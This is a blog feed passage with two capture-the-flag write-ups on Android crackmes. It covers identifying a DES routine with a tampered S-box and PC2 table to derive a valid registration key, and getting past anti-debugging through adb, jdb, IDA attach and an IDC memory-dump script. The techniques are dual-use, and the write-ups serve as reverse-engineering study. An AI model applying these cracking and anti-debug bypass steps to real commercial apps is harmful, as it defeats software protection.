&lt;p&gt;接下来以为我会继续分析下去吗？&lt;/p&gt;

&lt;p&gt;不，其实这里是初始化秘钥的地方，我还分析下去，神经病啊&lt;/p&gt;

&lt;p&gt;我看到了后面一层又一层的，而且明显的跟其它数据分开了&lt;/p&gt;

&lt;p&gt;我发现不对劲，而且这么多计算我都看不懂，于是开启猜测模式&lt;/p&gt;

&lt;p&gt;这里应该是某加密，前面那个8字节应该是秘钥，然后后面的函数一个个看，看看有没有什么Table，现代加密算法一般都有各种Table去做计算&lt;/p&gt;

&lt;p&gt;运气不错，发现了DES加密算法的S盒，要是不知道S盒是啥的。。。。。。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/9438CCA14475E46D51CF53F3A53757BA.png&quot; alt=&quot;28.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;它是八个二维数组，规格就是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8 * 4 * 16&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;可以自行对比一下，当然也可以靠其它Table的特征&lt;/p&gt;

&lt;p&gt;当然AES也有S盒，但是这两者的S盒是有很多区别的，比如AES的S盒如下&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unsigned char sBox[] =
{ /*  0    1    2    3    4    5    6    7    8    9    a    b    c    d    e    f */
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76, /*0*/ 
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0, /*1*/
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15, /*2*/
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75, /*3*/
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84, /*4*/
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf, /*5*/
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8, /*6*/ 
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2, /*7*/
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73, /*8*/
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb, /*9*/
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, /*a*/
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08, /*b*/
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a, /*c*/
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e, /*d*/
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf, /*e*/
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16  /*f*/
};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;首先是规模不一样，其实是数量不一样，输入输出的值也都不一样&lt;/p&gt;

&lt;p&gt;那么这里可以确定是DES加密算法，但是它是加密还是解密就需要再考量一下了&lt;/p&gt;

&lt;p&gt;先放着，我们接着看代码，在初始化完秘钥后，开始给两个数组进行初始化操作&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:000060D6 LDR             R2, [SP,#0x28+var_24] ; R2 = 结构体基址
LOAD:000060D8 LDR             R0, [R2,#0x38] ; R0 = s1 //结构体偏移0x38，为注册码
LOAD:000060DA BLX             strlen  ; R0 = strlen(s)
LOAD:000060DE LDR             R5, [SP,#0x28+var_24] ; R5 = 结构体基址
LOAD:000060E0 LSRS            R6, R0, #4 ; R6 = strlen(s) &amp;gt;&amp;gt; 4 //长度一定是非负，等效于除16
LOAD:000060E2 MOVS            R1, R4  ; R1 = R4 = 0
LOAD:000060E4 ADDS            R5, #0x3C ; '&amp;lt;' ; R5 = s2 //结构体偏移0x3C
LOAD:000060E6 MOVS            R0, R5  ; R0 = R5 = s2
LOAD:000060E8 MOVS            R2, #0x1E ; R2 = 0x1E
LOAD:000060EA BLX             memset  ; memset(s2, 0, 0x1E)
LOAD:000060EE B               loc_6108
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;顺带把注册码分为16字节每组，每组进行循环解密&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00006108 loc_6108
LOAD:00006108 CMP             R4, R6
LOAD:0000610A BLT             loc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;解密后的数据存储到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s2&lt;/code&gt;，结构体偏移&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x3C&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:000060F0 loc_60F0                ;
LOAD:000060F0 LDR             R2, [SP,#0x28+var_24] ; R2 = 结构体基址
LOAD:000060F2 LSLS            R3, R4, #4 ; i &amp;lt;&amp;lt; 4 //此处用于注册码偏移的跳转
LOAD:000060F4 ADD             R0, SP, #0x28+s ; R0 = s = buffer
LOAD:000060F6 LDR             R1, [R2,#0x38] ; R1 = s1 = 注册码
LOAD:000060F8 ADDS            R4, #1
LOAD:000060FA ADDS            R1, R1, R3
LOAD:000060FC BL              sub_58F8 ; 此处入口对数据进行解密
LOAD:00006100 MOVS            R0, R5  ; dest
LOAD:00006102 ADD             R1, SP, #0x28+s ; src
LOAD:00006104 BLX             strcat_0 ; 解密后的数据存储到s2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;最后第四个函数就是解密后的注册码和用户名进行对比，红色表示异常分支，蓝色表示正常循环，最后由两个灰色的代码块结束循环&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/B75C768FA33559A407435FE2A3793FAE.png&quot; alt=&quot;29.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;那么，那么，那么&lt;/p&gt;

&lt;p&gt;我们来计算一组有效的KEY&lt;/p&gt;

&lt;p&gt;不过好像出了点问题，哪里不对的样子&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/49E0D72A120B15DED0C896B9F3BB4C0D.png&quot; alt=&quot;30.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;因为在分析的时候我注意到了取了用户名前8位进行计算秘钥，而且后续使用了十六位进行分组解密&lt;/p&gt;

&lt;p&gt;所以这里单纯的使用了一个八字节字符串当做用户名进行输入&lt;/p&gt;

&lt;p&gt;竟然出错了。。。。。。&lt;/p&gt;

&lt;p&gt;再次打个断点进行调试，看看解密后的数据是个啥&lt;/p&gt;

&lt;p&gt;首先获取注册码&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/B32717F89A35230554B695DC0EC76349.png&quot; alt=&quot;31.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;然后两组计算完后，得到解密后的数据&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/811CE4E8B97A5446519AFAA963AB8751.png&quot; alt=&quot;32.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;那这个就很尴尬了，怎么会多出八位&lt;/p&gt;

&lt;p&gt;百撕不得姐，于是找老司机求教&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/1EC4CB3F4089E4018CF6735A482F99A2.png&quot; alt=&quot;33.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;发现用Java的加解密库计算出来的数据并不正确，其实可能是校验的过程改了&lt;/p&gt;

&lt;p&gt;正常情况下解密出来的数据应该是这样的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/E58C84ABEBE883CB4A1432785E912BDD.png&quot; alt=&quot;34.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;而我上面那个是个啥玩意。。。。。。&lt;/p&gt;

&lt;p&gt;搞得我很尴尬啊。。。。。。&lt;/p&gt;

&lt;p&gt;既然这样，那我就不客气了，去网上找DES的C代码实现&lt;/p&gt;

&lt;p&gt;随意找了个代码，看到了S盒，想起刚才也是S盒，会不会S盒动了手脚，于是对比了一波S盒&lt;/p&gt;

&lt;p&gt;首先把正常DES算法的S盒准备好&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;static char S_Box[8][4][16] = {
	// S1 
	14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7,
	0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8,
	4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0,
	15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13,
	// S2 
	15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10,
	3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5,
	0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15,
	13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9,
	// S3 
	10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8,
	13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1,
	13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7,
	1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12,
	// S4 
	7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15,
	13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9,
	10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4,
	3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14,
	// S5 
	2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9,
	14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6,
	4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14,
	11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3,
	// S6 
	12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11,
	10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8,
	9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6,
	4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13,
	// S7 
	4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1,
	13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6,
	1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2,
	6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12,
	// S8 
	13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7,
	1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2,
	7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8,
	2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11
};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后将动态调试时的S盒dump出来&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/CBC29C4253BEBDAFA3EBFD45434B091F.png&quot; alt=&quot;35.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;跟前面拷贝出&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xor_table&lt;/code&gt;一样，使用保存为文件，然后WinHex转为C Source&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unsigned AnsiChar data[512] = {
	0x0E, 0x04, 0x0D, 0x01, 0x02, 0x0F, 0x0B, 0x08, 0x03, 0x0A, 0x06, 0x0C, 0x05, 0x09, 0x00, 0x07, 
	0x00, 0x0F, 0x07, 0x04, 0x0E, 0x02, 0x0D, 0x01, 0x0A, 0x06, 0x0C, 0x0B, 0x09, 0x05, 0x03, 0x08, 
	0x04, 0x01, 0x0E, 0x08, 0x0D, 0x06, 0x02, 0x0B, 0x0F, 0x0C, 0x09, 0x07, 0x03, 0x0A, 0x05, 0x00, 
	0x0F, 0x0C, 0x08, 0x02, 0x04, 0x09, 0x01, 0x07, 0x05, 0x0B, 0x03, 0x0E, 0x0A, 0x00, 0x06, 0x0D, 
	0x0F, 0x01, 0x08, 0x0E, 0x06, 0x0B, 0x03, 0x04, 0x09, 0x07, 0x02, 0x0D, 0x0C, 0x00, 0x05, 0x0A, 
	0x03, 0x0D, 0x04, 0x07, 0x0F, 0x02, 0x08, 0x0E, 0x0C, 0x00, 0x01, 0x0A, 0x06, 0x09, 0x0B, 0x05, 
	0x00, 0x0E, 0x07, 0x0B, 0x0A, 0x04, 0x0D, 0x01, 0x05, 0x08, 0x0C, 0x06, 0x09, 0x03, 0x02, 0x0F, 
	0x0D, 0x08, 0x0A, 0x01, 0x03, 0x0F, 0x04, 0x02, 0x0B, 0x06, 0x07, 0x0C, 0x00, 0x05, 0x0E, 0x09, 
	0x0A, 0x00, 0x09, 0x0E, 0x06, 0x03, 0x0F, 0x05, 0x01, 0x0D, 0x0C, 0x07, 0x0B, 0x04, 0x02, 0x08, 
	0x0D, 0x07, 0x00, 0x09, 0x03, 0x04, 0x06, 0x0A, 0x02, 0x08, 0x05, 0x0E, 0x0C, 0x0B, 0x0F, 0x01, 
	0x0D, 0x06, 0x04, 0x09, 0x08, 0x0F, 0x03, 0x00, 0x0B, 0x01, 0x02, 0x0C, 0x05, 0x0A, 0x0E, 0x07, 
	0x01, 0x0A, 0x0D, 0x00, 0x06, 0x09, 0x08, 0x07, 0x04, 0x0F, 0x0E, 0x03, 0x0B, 0x05, 0x02, 0x0C, 
	0x07, 0x0D, 0x0E, 0x03, 0x00, 0x06, 0x09, 0x0A, 0x01, 0x02, 0x08, 0x05, 0x0B, 0x0C, 0x04, 0x0F, 
	0x0D, 0x08, 0x0B, 0x05, 0x06, 0x0F, 0x00, 0x03, 0x04, 0x07, 0x02, 0x0C, 0x01, 0x0A, 0x0E, 0x09, 
	0x0A, 0x06, 0x09, 0x00, 0x0C, 0x0B, 0x07, 0x0D, 0x0F, 0x01, 0x03, 0x0E, 0x05, 0x02, 0x08, 0x04, 
	0x03, 0x0F, 0x00, 0x06, 0x0A, 0x01, 0x0D, 0x08, 0x09, 0x04, 0x05, 0x0B, 0x0C, 0x07, 0x02, 0x0E, 
	0x02, 0x0C, 0x04, 0x01, 0x07, 0x0A, 0x0B, 0x06, 0x08, 0x05, 0x03, 0x0F, 0x0D, 0x00, 0x0E, 0x09, 
	0x0E, 0x0B, 0x02, 0x0C, 0x04, 0x07, 0x0D, 0x01, 0x05, 0x00, 0x0F, 0x0A, 0x03, 0x09, 0x08, 0x06, 
	0x04, 0x02, 0x01, 0x0B, 0x0A, 0x0D, 0x07, 0x08, 0x0F, 0x09, 0x0C, 0x05, 0x06, 0x03, 0x00, 0x0E, 
	0x0B, 0x08, 0x0C, 0x07, 0x01, 0x0E, 0x02, 0x0D, 0x06, 0x0F, 0x00, 0x09, 0x0A, 0x04, 0x05, 0x03, 
	0x0C, 0x01, 0x0A, 0x0F, 0x09, 0x02, 0x06, 0x08, 0x00, 0x0D, 0x03, 0x04, 0x0E, 0x07, 0x05, 0x0B, 
	0x0A, 0x0F, 0x04, 0x02, 0x07, 0x0C, 0x00, 0x05, 0x06, 0x01, 0x0D, 0x0E, 0x00, 0x0B, 0x03, 0x08, 
	0x09, 0x0E, 0x0F, 0x05, 0x02, 0x08, 0x0C, 0x03, 0x07, 0x00, 0x04, 0x0A, 0x01, 0x0D, 0x0B, 0x06, 
	0x04, 0x03, 0x02, 0x0C, 0x09, 0x05, 0x0F, 0x0A, 0x0B, 0x0E, 0x01, 0x07, 0x06, 0x00, 0x08, 0x0D, 
	0x04, 0x0B, 0x02, 0x0E, 0x0F, 0x00, 0x08, 0x0D, 0x03, 0x0C, 0x09, 0x07, 0x05, 0x0A, 0x06, 0x01, 
	0x0D, 0x00, 0x0B, 0x07, 0x04, 0x00, 0x01, 0x0A, 0x0E, 0x03, 0x05, 0x0C, 0x02, 0x0F, 0x08, 0x06, 
	0x01, 0x04, 0x0B, 0x0D, 0x0C, 0x03, 0x07, 0x0E, 0x0A, 0x0F, 0x06, 0x08, 0x00, 0x05, 0x09, 0x02, 
	0x06, 0x0B, 0x0D, 0x08, 0x01, 0x04, 0x0A, 0x07, 0x09, 0x05, 0x00, 0x0F, 0x0E, 0x02, 0x03, 0x0C, 
	0x0D, 0x02, 0x08, 0x04, 0x06, 0x0F, 0x0B, 0x01, 0x0A, 0x09, 0x03, 0x0E, 0x05, 0x00, 0x0C, 0x07, 
	0x01, 0x0F, 0x0D, 0x08, 0x0A, 0x03, 0x07, 0x04, 0x0C, 0x05, 0x06, 0x0B, 0x00, 0x0E, 0x09, 0x02, 
	0x07, 0x0B, 0x04, 0x01, 0x09, 0x0C, 0x0E, 0x02, 0x00, 0x06, 0x0A, 0x0D, 0x0F, 0x03, 0x05, 0x08, 
	0x02, 0x01, 0x0E, 0x07, 0x04, 0x0A, 0x08, 0x0D, 0x0F, 0x0C, 0x09, 0x00, 0x03, 0x05, 0x06, 0x0B
};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后跟上面正常的S盒进行循环对比，找到不同的地方&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/EADBB5EBC3523E90CF43CE0D98BAC533.png&quot; alt=&quot;36.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;还真的有两处不一样，出题的你良心不会痛吗？&lt;/p&gt;

&lt;p&gt;那看来这里是需要自己实现加密代码了。。。。。。&lt;/p&gt;

&lt;p&gt;好在以前存了不少代码，小书包翻啊翻，把Java实现的代码翻了出来&lt;/p&gt;

&lt;p&gt;不过测试的时候发现各种问题，弄的很尴尬。。。。。。&lt;/p&gt;

&lt;p&gt;所以还是老实找C语言实现的代码&lt;/p&gt;

&lt;p&gt;接下来就开始扎心了。。。。。。&lt;/p&gt;

&lt;p&gt;找了个C实现的DES算法代码，发现结果不对&lt;/p&gt;

&lt;p&gt;想了想，如果S盒有问题，那么其它几个Table和盒子可能也有问题，于是开始对比了一波，最后发现PC2_Table有问题&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/21ED8DB3AA296F44D02532808AA998C2.png&quot; alt=&quot;37.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;再一次的计算，发现注册码计算还是有问题，当时场面一度很尴尬。。。。。。&lt;/p&gt;

&lt;p&gt;突然，我想起了一件事，秘钥开始的时候经过了一次神奇的异或&lt;/p&gt;

&lt;p&gt;这尼玛。。。。。。&lt;/p&gt;

&lt;p&gt;赶紧的赶紧的，继续改代码&lt;/p&gt;

&lt;p&gt;东平西凑，瞎改瞎改&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/3E7CDB99EE3FB5BB690CBA45A1306120.png&quot; alt=&quot;38.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;就先这样吧，眼泪掉下来，以后再找个时间分析一个这个样本的保护技术&lt;/p&gt;

&lt;p&gt;最后，如果是第一次接触这种动静结合分析的同学，要时刻注意指令集的切换，中间有大量的指令集切换，看指令的地址即可，通常都是三步走，断在调用处，先别跟过去，此时跟过去会断不下来的，直接效果就是和F9一样，这一点应该有体会吧，比如使用的是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BL R3&lt;/code&gt;，在这一句下个断点，先断下来，直接在反汇编窗口跟随R3，就可以看到要执行的代码了，但是如果指令集识别有问题，需要先&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ALT + G&lt;/code&gt;，选择Thumb模式，然后按一下C转为代码模式，再按P识别函数&lt;/p&gt;

&lt;p&gt;这几天大学陆续开学了，看着那些萌新，突然就想起四年前自己到学校报到的场景，阳光明媚，岁月静好&lt;/p&gt;

&lt;p&gt;Hey guys，I miss you&lt;/p&gt;

&lt;p&gt;现在分析东西比以前费劲多了，分析到一半，下班时间到了，不赶紧走的话一会连地铁都赶不上了，回家想接着分析，环境又得重新跑。。。。。。&lt;/p&gt;

&lt;p&gt;所以IDA的配色变来变去的&lt;/p&gt;

&lt;p&gt;今天的补天沙龙没去，有事，星期二和星期三的2017ISC，DefCon 010，Syscan 360也去不了了，每次和湿敷们约好面基都各种原因去不了，而又会在某些不经意的场合碰到，所以，以后有时间再约吧&lt;/p&gt;

&lt;p&gt;看着最近小盆友们秋招，后悔为毛去年不海投一波&lt;/p&gt;

&lt;p&gt;不过估计投了也只能和现在一样每天拖地&lt;/p&gt;
</description>
                <pubDate>Mon, 11 Sep 2017 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/android_ctf/2017/09/11/2014-NAGA&PIOWIND-APP%E5%BA%94%E7%94%A8%E6%94%BB%E9%98%B2%E7%AB%9E%E8%B5%9B-crackme.l4.sign.html</link>
                <guid isPermaLink="true">http://localhost:4000/android_ctf/2017/09/11/2014-NAGA&PIOWIND-APP%E5%BA%94%E7%94%A8%E6%94%BB%E9%98%B2%E7%AB%9E%E8%B5%9B-crackme.l4.sign.html</guid>
            </item>
        
            <item>
                <title>2014 NAGA&PIOWIND APP应用攻防竞赛 - crackme.l3.sign</title>
                <description>&lt;p&gt;一开始用模拟器跑起来就崩溃，我以为是模拟器系统版本的问题，后来看了配置文件，发现没有问题，猜测可能是有反调试，第三题了应该出现反调试了&lt;/p&gt;

&lt;p&gt;于是使用调试模式启动应用&lt;/p&gt;

&lt;p&gt;先修改&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;android_server&lt;/code&gt;的名称和监听端口&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@generic:/data/local/tmp # ./as -p23333
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;相应的端口转发也要修改&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Users\Luyu&amp;gt;adb forward tcp:23946 tcp:23333
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后调试模式启动&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;adb shell am start -D -n com.crackme/.MainActivity
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;开启DDMS，选中待调试的应用，前面出现小虫子&lt;/p&gt;

&lt;p&gt;然后输入&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Users\Luyu&amp;gt;jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700
设置未捕获的java.lang.Throwable
设置延迟的未捕获的java.lang.Throwable
正在初始化jdb...
&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;如果出现如下信息，先关掉Android Studio等玩意&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Users\Luyu&amp;gt;jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700
java.net.ConnectException: Connection refused: connect
        at java.net.DualStackPlainSocketImpl.connect0(Native Method)
        at java.net.DualStackPlainSocketImpl.socketConnect(DualStackPlainSocketImpl.java:79)
        at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:350)
        at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:206)
        at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:188)
        at java.net.PlainSocketImpl.connect(PlainSocketImpl.java:172)
        at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392)
        at java.net.Socket.connect(Socket.java:589)
        at com.sun.tools.jdi.SocketTransportService.attach(SocketTransportService.java:222)
        at com.sun.tools.jdi.GenericAttachingConnector.attach(GenericAttachingConnector.java:116)
        at com.sun.tools.jdi.SocketAttachingConnector.attach(SocketAttachingConnector.java:90)
        at com.sun.tools.example.debug.tty.VMConnection.attachTarget(VMConnection.java:519)
        at com.sun.tools.example.debug.tty.VMConnection.open(VMConnection.java:328)
        at com.sun.tools.example.debug.tty.Env.init(Env.java:63)
        at com.sun.tools.example.debug.tty.TTY.main(TTY.java:1082)

致命错误:
无法附加到目标 VM。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;修改调试选项，然后使用IDA attach&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/1098ADA7B554FCDE0F477ED5A2D8DA91.png&quot; alt=&quot;1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;挂上去后，点击运行，或者F9，断在ELF的入口&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/6FEC6AB80F61B9E4F77EC583DC947D2A.png&quot; alt=&quot;2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;按照前两题的方法dump解密后的so即可&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;auto fp, dex_addr, end_addr;  
fp = fopen(&quot;E:\\libcrackme.so&quot;, &quot;wb&quot;);  
for(dex_addr = 0xA33AC000; dex_addr &amp;lt; 0xA3406000; dex_addr++)
    fputc(Byte(dex_addr), fp);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;文件头依旧是空的，使用正常的ELF文件头覆盖回去，使用IDA打开，找到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt; _Z9fdog_initv&lt;/code&gt;，这里实现了反调试&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/498EFB365FF6DD6C40D43077284A2AC1.png&quot; alt=&quot;3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;跟入该函数，该函数创建了很多的子线程进行反调试，我们一个个跟&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/A5A58A49602207AB31764C6B18C5C4E1.png&quot; alt=&quot;4.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这里有一个问题，创建子线程时的函数地址是动态调试时内存的地址，如果不清楚我们看伪代码&lt;/p&gt;

